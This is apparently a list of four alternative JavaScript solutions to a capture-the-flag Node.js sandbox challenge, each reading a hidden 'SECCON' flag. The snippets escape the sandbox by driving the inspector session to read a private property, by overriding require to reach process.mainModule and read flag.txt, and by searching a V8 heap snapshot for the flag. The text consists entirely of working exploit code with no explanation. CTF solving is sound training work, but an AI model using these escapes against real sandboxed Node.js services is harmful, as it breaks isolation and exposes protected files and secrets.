global.flag = flag;
const inspector = require('inspector');
const session = new inspector.Session();
session.connect();
session.post('Runtime.evaluate', {expression: 'flag'}, (e, d) => {
	session.post('Runtime.getProperties', {objectId: d.result.objectId}, (e, d) => {
		console.log(d.privateProperties[0].value.value);
	});
});

OR

function require() {
	const fs = process.mainModule.require('fs');
	console.log(fs.readFileSync('flag.txt').toString());
}

OR

function require() {
	console.log(process.mainModule.load('./flag.txt'))
}

OR

const v8 = require('v8');
const memory = v8.getHeapSnapshot().read();
const index = memory.indexOf('SEC' + 'CON');
const len = memory.slice(index).indexOf('}');
const flagBuffer = memory.slice(index, index + len + 1);
console.log(flagBuffer.toString());